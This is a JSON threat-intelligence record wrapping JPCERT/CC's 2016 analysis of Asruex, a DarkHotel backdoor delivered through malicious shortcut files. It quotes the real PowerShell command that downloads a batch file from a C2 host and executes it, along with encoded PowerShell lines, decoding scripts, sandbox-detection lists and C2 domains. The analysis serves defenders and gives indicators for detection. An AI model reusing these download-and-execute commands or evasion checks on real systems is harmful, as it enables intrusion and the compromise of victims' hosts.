@@ -1,0 +1,150 @@
+{
+    "id": "df2fb670-a207-46c3-8a40-0ea8f5188e49",
+    "created_at": "2022-10-25T16:48:18.828895Z",
+    "updated_at": "2025-03-27T02:15:41.643883Z",
+    "deleted_at": null,
+    "sha1_hash": "0ddd9b23aaa773615e7d6392969d40b332e0c85f",
+    "title": "Asruex: Malware Infecting through Shortcut Files",
+    "authors": "JPCERT",
+    "file_creation_date": "2016-07-17T14:08:07Z",
+    "file_modification_date": "0001-01-01T00:00:00Z",
+    "file_size": 181845,
+    "plain_text": "**blog.jpcert.or.jp/2016/06/asruex-malware-infecting-through-shortcut-files.html**\n\nJPCERT/CC has been observing malicious shortcut files that are sent as email attachments to a limited range of\norganisations since around October 2015. When this shortcut file is opened, the host will be infected with malware\ncalled “Asruex”. The malware has a remote controlling function, and attackers sending these emails seem to attempt\nintruding into the targets’ network using the malware. According to a blog article by Microsoft, the malware is\nassociated with an attacker group identified as “DarkHotel” (Microsoft calls it as \"Dubnium\") [1]. This blog entry will\nintroduce the details of Asruex.\n\n## Infection Mechanism of Asruex\n\nFigure 1 describes the chain of events after a victim opens the malicious shortcut file until the host gets infected with\nAsruex.\n\nFigure 1: Chain of events after a victim opens the malicious shortcut file until the\n\nhost gets infected with Asruex\n\nFor those cases that JPCERT/CC has observed, when the shortcut file is opened, a downloader is downloaded from\na C&C server and then executed. The downloader then downloads Asruex from another C&C server, which is then\nexecuted. Detailed behaviour observed in each phase will be explained in the next section.\n\n## Details of the Shortcut File\n\n\n-----\n\npowershell -windowstyle hidden $c='(new-object\nSystem.Net.WebClient).D'+'ownloadFile(\"\"\"http://online-dropbox.com/online/a\n\"\"\", \"\"\"$env:tmp\\gst.bat\"\"\")';Invoke-Expression $c&%tmp%\\gst.bat \"%CD%\"\n\nThe above PowerShell command downloads a file from the specified URL, and it is saved as a batch file to be\nexecuted. The batch file contains the following commands, which execute PowerShell scripts (marked in red).\n\necho\npowershell -Enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUw…\nchcp 65001\ncd \"%tmp%\"\nstart winword \"article_draft.docx\"\ncopy \"article_draft.docx\" \"%1\"\ndel /f \"%1\\*.*.lnk\"\necho\npowershell -Enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMA…\n\"%tmp%\\dwm.exe\"\n\nWhen the batch file is executed, a Windows executable file (a downloader) and a dummy file for display will be\ndownloaded from a C&C server, saved in %TEMP% folder and then executed. Those decoy documents are written\nin Japanese, but some are also in Chinese, which implies that the target for this attack is not limited to Japanese\norganisations.\n\n## Details of the Downloader\n\nWhen the downloader is executed, it downloads a .jpg or .gif image file. Encoded Asruex is contained in the latter\npart of the image file. The downloader decodes it and then executes the malware.\n\nFigure 2: An Image File Containing Encoded Asruex\n\nAsruex contained in the image file is encoded using XOR. The following Python script is used for decoding the\nencoded data of the image file. The size of the encoded data is specified in the last 4 bytes of the image file.\n\nkey = 0x1D # Keys may vary depending on the sample\nfor i in range(0, length):\n\n\n-----\n\nkey &=0xff\n\nThe downloader may contain an encoded executable file of Process Hacker (a multi-function task manager), and it\nmay execute the Process Hacker if an anti-virus software is detected. Anti-virus software such as by Symantec,\nMcAfee and Kaspersky, etc., are detected based on the process names.\n\n## Details of Asruex\n\nAsruex is a kind of malware that communicates with the C&C server over HTTP, and executes the command\nreceived through the communication. It has various anti-analysis features such as preventing the malware from\nrunning when it detects a virtual machine. Please refer to Appendix A for conditions which Asruex detects a virtual\nmachine. The malware is also capable of detecting anti-virus software.\n\nIf Asruex does not detect a virtual machine, it executes one of the following executable files, and injects a DLL file\nwhich is contained in Asruex. In case where it detects anti-virus software, Asruex generates a DLL file and loads it to\nitself (but does not perform DLL injection). This DLL file contains the core functions of Asruex.\n\nsdiagnhost.exe\n\nwksprt.exe\n\ntaskhost.exe\n\ndwm.exe\n\nwinrshost.exe\n\nwsmprovhost.exe\n\nctfmon.exe\n\nexplorer.exe\n\nThe DLL injected, or generated and loaded, sends an HTTP request to a dummy host. If it receives a reply of status\ncode that is 100 or greater, it connects to an actual C&C server as follows:\n\nGET /table/list.php?\na1=6fcadf059e54a19c7b96b0758a2d20a4396b85e77138dbaff3fddd04909de91\n62a8910eab1141343492e90a78e75bfa7cafa3ed0a51740daa4cad36291e637074255217 –omittedHTTP/1.1\nConnection: Keep-Alive\nContent-Type: text/plain; charset=utf-8\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/27.0.1453.116 Safari/537.36\nHost: [host name]\n\nAsruex operates based on the configuration information stored in itself. The configuration Information includes C&C\nservers and dummy hosts that it connects to, and also version information and a key to decode data which is\ndelivered. For further details on the configuration information, please refer to Appendix B.\n\nThe configuration information is encoded. It can be decoded with the following Python code:\n\n\n-----\n\nconfig_offset = offset + 4\nencode_config = data[config_offset:config_offset+config_size]\ni = 0\nseed = config_size * 2 // It does not necessarily double\nwhile i < config_size:\n(result, seed) = rand_with_seed(seed)\nresult &= 0xff\ndecode_data.append(chr(ord(encode_config[i]) ^ result))\ni += 1\ndecode_config = \"\".join(decode_data)\n(decode_size,) = struct.unpack(\"=I\", decode_config[config_size-4:config_size])\nconfig = lznt1_decompress(decode_config, config_size, decode_size)\n\nAsruex executes commands that are received from a C&C server. Commands that are possibly executed are listed\nin Table 1. Most of the commands are used for collecting information, but some are for downloading DLL files\n(AdvProv.dll) from C&C servers and for executing them. AdvProv.dll is a plug-in to expand functions of Asruex.\n\nTable 1: Commands used by Asruex\n\n**Command** **Function**\n\n1 Collect information of infected hosts\n\n2 Obtain process list\n\n3 Obtain file list\n\n4 Change waiting time\n\n5 Obtain version information\n\n6 Uninstall\n\n501 Obtain folder list\n\n502 Load DLL\n\n - Execute external DLL (AdvProv.dll)\n\n## Details of AdvProv.dll\n\nAdvProv.dll is encrypted using XOR and 3DES. Decryption key is calculated based on the destination URL and the\nencoding key of the configuration information. Asruex downloads a DLL, loads it into the memory and executes\nDLL’s export function, Get_CommandProc. AdvProv.dll adds the following commands to Asruex:\n\n\n-----\n\nAdvProv.dll\n\n**Command** **Function**\n\n101 Download\n\n102 Copy a file\n\n103 Change a file name\n\n104 Change file time\n\n105 Delete a file\n\n106 Terminate a process\n\n107 Search a registry\n\n108 Show a registry entry\n\n109 Create a registry entry\n\n110 Show a registry entry\n\n111 Delete a registry entry\n\n112 Update\n\n601 Download and execute a file\n\nSamples of AdvProv.dll that JPCERT/CC has observed had the listed functions. However, there may be some other\nversions with different functions.\n\n## Summary\n\nAsruex is a relatively new kind of malware that has been seen since around October 2015. It is likely that targeted\nattacks using Asruex will continue.\n\nHash values of artifacts demonstrated in this article are described in Appendix C. Also, destination URLs confirmed\nby JPCERT/CC are listed in Appendix D. It is recommended to make sure that the hosts you use are not accessing\nthese URLs.\n\nThanks for reading.\n\n- Shusei Tomonaga\n\n_(Translated by Yukako Uchida)_\n\n## Reference\n\n\n-----\n\n_[https://blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/](https://blogs.technet.microsoft.com/mmpc/2016/06/09/reverse-engineering-dubnium-2/)_\n\n## Appendix A: Conditions where Asurex detects an analysis environment\n\nIf Asruex detects itself being operated in an environment under any of the following conditions (Table A-1 to A-6), it\nrecognises that it is an analysis environment and stops running.\n\nTable A-1: The user matches the computer name and user name as listed.\n\nTable A-2: Listing up the loaded modules, and if the listed functions are found to be exported.\n\nTable A-3: The listed file names are found.\n\nTable A-4: The listed process names are running.\n\nTable A-5: Listing up the process modules that are running, and the module version matches the combination listed.\n\nTable A-6: The disk name contains the listed strings.\n\nTable A-1: Detectable Combination of\n\nComputer Name and User Name\n\n**Computer Name** **User Name**\n\nBRBRB-D8FB22AF1 antonie\n\nANTONY-PC Antony\n\nTEQUILABOOMBOOM janettedoe\n\nHBXPENG makrorechner\n\nIOAVM Administrator\n\nXANNY Administrator\n\nNONE-DUSEZ58JO1 Administrator\n\nrtrtrele Administrator\n\nHOME-OFF-D5F0AC Dave\n\nDELL-D3E64F7E26 Administrator\n\nJONATHAN-C561E0 Administrator\n\nHANS HanueleBaser\n\nIePorto Administrator\n\n\n-----\n\n**Functions**\n\n_SbieDll_Hook@12\n\n_SbieApi_QueeryProcessPath@28\n\nhook_api\n\nNew2_CreateProcessInternalW@48\n\nTable A-3: Detectable File\n\nNames\n\n**File Names**\n\n\\\\.\\pipe\\cuckoo\n\n[System Drive]:\\cuckoo\n\nTable A-4:\nDetectable Process\n\nNames\n\n**Process Names**\n\nFilemon.exe\n\nRegmon.exe\n\nProcmon.exe\n\nTcpview.exe\n\nwireshark.exe\n\ndumpcap.exe\n\nregshot.exe\n\ncports.exe\n\nsmsniff.exe\n\nSocketSniff.exe\n\nTable A-5: Detectable Combinations of File Version Information\n\n**FileDescription** **CompanyName**\n\nSysinternals\n\n\n-----\n\nSysinternalsRegistryMonitor Sysinternals\n\nProcessMonitor Sysinternals\n\nTCP/UDPendpointviewer Sysinternals\n\nWireshark TheWiresharkdevelopercommunity\n\nDumpcap TheWiresharkdevelopercommunity\n\nRegshot RegshotTeam\n\nCurrPorts NirSoft\n\nSmartSniff NirSoft\n\nSocketSniff NirSoft\n\nTable A-6: Detectable Disk\n\nNames\n\n**Disk Name**\n\nvmware\n\nVirtual HD\n\nMS VirtualSCSI Disk Device\n\n## Appendix B: Configuration Information\n\nTable B-1: List of Configuration Information\n\n**Offset** **Length** **Description**\n\n0x000 16 ID\n\n0x010 4 Version Information\n\n0x014 256 Install Path\n\n0x114 64 * 3 Dummy URLs to connect to × 3\n\n0x1D4 256 * 3 HTTP Access URLs × 3\n\n0x4D4 256 Sending data store path 1\n\n0x5D4 64 Sending data strings 1\n\n\n-----\n\n0x614 256 Sending data store path 2\n\n0x714 64 Sending data strings 2\n\n0x754 64 Encode key\n\n0x794 4 Suspension time\n\n0x798 256 * 3 File name × 3\n\n0xA98 4 Machine information (pointer)\n\n0xA9C 4 Connect destination (pointer)\n\n0xAA0 4 Not in use\n\nEncode keys\n\nblackolive\n\ndarktea\n\n12qw@#WE\n\n## Appendix C: SHA-256 Hash Value of Artifacts\n\nShortcut files:\n\nc60a93a712d0716a04dc656a0d1ba06be5047794deaa9769a2de5d0fcf843c2a\n\nae421dd24306cbf498d4f82b650b9162689e6ef691d53006e8f733561d3442e2\n\n980cc01ec7b2bd7c1f10931822c7cfe2a04129588caece460e05dcc0bb1b6c34\n\nb175567800d62dcb00212860d23742290688cce37864930850522be586efa882\n\nc2e99eedf555959721ef199bf5b0ac7c68ea8205d0dff6c208adf8813411a456\n\nac63703ea1b36358d2bec54bddfef28f50c635d1c7288c2b08cceb3608c1aa27\n\n5cfc67945dd39885991131f49f6717839a3541f9ba141a7a4b463857818d01e6\n\ne76c37b86602c6cc929dffe5df7b1056bff9228dde7246bf4ac98e364c99b688\n\n606e98df9a206537d35387858cff62eb763af20853ac3fa61aee8f3c280aaafe\n\nDownloaders:\n\nfdf3b42ac9fdbcabc152b200ebaae0a8275123111f25d4a68759f8b899e5bdd6\n\ndd2cba1a0d54a486a39f63cbd4df6129755a84580c21e767c44c0a7b60aff600\n\nd89e2cc604ac7da05feeb802ed6ec78890b1ef0a3a59a8735f5f772fc72c12ef\n\ncaefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8\n\n\n-----\n\n05f241784e673f2af8a2a423fb66e783a97f123fc3d982144c39e92f191d138d\n\na77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827\n\n2273236013c1ae52bfc6ea327330a4eba24cc6bc562954854ae37fe55a78310b\n\n36581a19160f2a06c617a7e555ad8ec3280692442fd81bde3d47a59aea2be09a\n\na3f1a4a5fea81a6f12ef2e5735bb845fb9599df50ffd644b25816f24c79f53b6\n\n24b587280810fba994865d27f59a01f4bbdaf29a14de50e1fc2fadac841c299e\n\n2c68cf821c4eabb70f28513c5e98fa11b1c6db6ed959f18e9104c1c882590ad2\n\n3f2168a9a51d6d6fe74273ebfc618ded3957c33511435091885fa8c5f854e11e\n\ndf72a289d535ccf264a04696adb573f48fe5cf27014affe65da8fd98750029db\n\neacc46f54fa8c8a8cf51368305803d949fa2625066ec634da9a41d08f2855617\n\ne139a8916f99ce77dbdf57eaeac5b5ebe23367e91f96d7af59bee7e5919a7a81\n\n8a6d76bd21e70a91abb30b138c12d0f97bb4971bafa072d54ce4155bea775109\n\n35fc95ec78e2a5ca3c7a332db9ca4a5a5973607a208b9d637429fe1f5c760dd5\n\nAsruex:\n\n8af41d303db8a975759f7b35a236eb3e9b4bd2ef65b070d19bd1076ea96fa5c4\n\na9ce1f4533aeec680a77d7532de5f6b142eb8d9aec4fdbe504c37720befe9ce3\n\n9350f7eb28f9d72698216105c51a4c5ad45323f907db9936357d6914fc992c90\n\n694de22c0b1a45c0e43caaa91486bc71a905443b482f2d22ded16b5ce3b0e738\n\n18e12feeb3fb4117ca99e152562eada2eb057c09aab8f7a424e6d889f70feb6c\n\n148a834e2717d029a4450dfa7206fd7d36c420edb95068c57766da0f61b288e8\n\nd869ce2ba491713e4c3f405ad500245d883b0e7b66abeee2522e701c8493388a\n\nfca19a78fc71691f3f97808624b24f00dd1f19ccadcc6e3a7e2be5b976d8937b\n\neb31f931f0e2abf340f3f95861a51e30677fd4216b2e4ee4d8570b41cb41249c\n\n7a95930aa732d24b4c62191247dcdc4cb483d8febaab4e21ca71fec8f29b1b7c\n\nAdvProv.dll\n\nf06000dceb4342630bf9195c2475fcd822dfe3910b0fa21691878071d0bb10fc\n\nOthers\n\n6d4e7d190f4d7686fd06c823389889d226ea9c8524c82c59a765bba469f2f723\n\ne7d51bb718c31034b597aa67408a015729be85fc3aefcc42651c57d673a4fe5a\n\n7074a6d3ab049f507088e688c75bae581fad265ebb6da07b0efd789408116ec8\n\n## Appendix D: Hosts that Asruex connects to\n\nvodsx.net\n\n\n-----\n\nservice365-team.com\n\ndatainfocentre.com\n\neworldmagazine.org\n\nsupportservice247.com\n\nseminarinfocenter.net\n\nvdswx.net\n\nhousemarket21.com\n\nproduct-report24.com\n\nrequestpg.net\n\nsecu-docu.net\n\nsend-error.net\n\nsend-form.net\n\nwzixx.net\n\nlogin-confirm.com\n\n2.gp\n\n2.ly\n\nonline-dropbox.com\n\nsendspaces.net\n\ninstitute-secu.org\n\npb.media-total.org\n\nresponse-server.com\n\nenewscenters.com\n\nsbidnest.com\n\nservicemain.com\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
+            "created_at": "2022-10-25T15:59:19.552139Z",
+            "updated_at": "2022-10-25T15:59:19.552139Z",
+            "deleted_at": null,
+            "name": "APTnotes",
+            "url": "https://github.com/aptnotes/data",
+            "description": "APTnotes data",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://app.box.com/s/mxvgs6dx4kixjv5s29yc6m81kii8opbw"
+    ],
+    "report_names": [
+        "JPCERT_AsruexShortcutFiles(06-30-2016)"
+    ],
+    "threat_actors": [
+        {
+            "id": "1dadf04e-d725-426f-9f6c-08c5be7da159",
+            "created_at": "2022-10-25T15:50:23.624538Z",
+            "updated_at": "2025-03-27T02:00:55.508759Z",
+            "deleted_at": null,
+            "main_name": "Darkhotel",
+            "aliases": [
+                "Darkhotel",
+                "DUBNIUM",
+                "Zigzag Hail"
+            ],
+            "source_name": "MITRE:Darkhotel",
+            "tools": null,
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "b13c19d6-247d-47ba-86ba-15a94accc179",
+            "created_at": "2024-05-01T02:03:08.149923Z",
+            "updated_at": "2025-03-27T02:05:17.422065Z",
+            "deleted_at": null,
+            "main_name": "TUNGSTEN BRIDGE",
+            "aliases": [
+                "DUBNIUM ",
+                "DarkHotel ",
+                "CTG-1948 "
+            ],
+            "source_name": "Secureworks:TUNGSTEN BRIDGE",
+            "tools": [
+                "Nemim"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
+            "created_at": "2023-01-06T13:46:38.272109Z",
+            "updated_at": "2025-03-27T02:00:02.790029Z",
+            "deleted_at": null,
+            "main_name": "DarkHotel",
+            "aliases": [
+                "DUBNIUM",
+                "Fallout Team",
+                "Luder",
+                "Tapaoux",
+                "Shadow Crane",
+                "APT-C-06",
+                "SIG25",
+                "Karba",
+                "Nemim",
+                "Nemin",
+                "G0012",
+                "ATK52",
+                "T-APT-02",
+                "TUNGSTEN BRIDGE",
+                "Zigzag Hail"
+            ],
+            "source_name": "MISPGALAXY:DarkHotel",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
+            "created_at": "2022-10-25T16:07:23.528994Z",
+            "updated_at": "2025-03-27T02:02:09.847683Z",
+            "deleted_at": null,
+            "main_name": "DarkHotel",
+            "aliases": [
+                "APT-C-06",
+                "ATK 52",
+                "CTG-1948",
+                "Dubnium",
+                "Fallout Team",
+                "Higaisa",
+                "Luder",
+                "Operation DarkHotel",
+                "Operation Daybreak",
+                "Operation Inexsmar",
+                "Operation PowerFall",
+                "Operation The Gh0st Remains the Same",
+                "SIG25",
+                "Shadow Crane",
+                "T-APT-02",
+                "Tungsten Bridge",
+                "Zigzag Hail"
+            ],
+            "source_name": "ETDA:DarkHotel",
+            "tools": [
+                "Asruex",
+                "DarkHotel",
+                "DmaUp3.exe",
+                "GreezeBackdoor",
+                "Karba",
+                "Nemain",
+                "Nemim",
+                "Ramsay",
+                "Retro",
+                "Tapaoux",
+                "Trojan.Win32.Karba.e",
+                "Virus.Win32.Pioneer.dx",
+                "igfxext.exe",
+                "msieckc.exe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1666716498,
+    "ts_updated_at": 1743041741,
+    "ts_creation_date": 1468764487,
+    "ts_modification_date": 0,
+    "files": {
+        "pdf": "https://archive.orkl.eu/0ddd9b23aaa773615e7d6392969d40b332e0c85f.pdf",
+        "text": "https://archive.orkl.eu/0ddd9b23aaa773615e7d6392969d40b332e0c85f.txt",
+        "img": "https://archive.orkl.eu/0ddd9b23aaa773615e7d6392969d40b332e0c85f.jpg"
+    }
+}
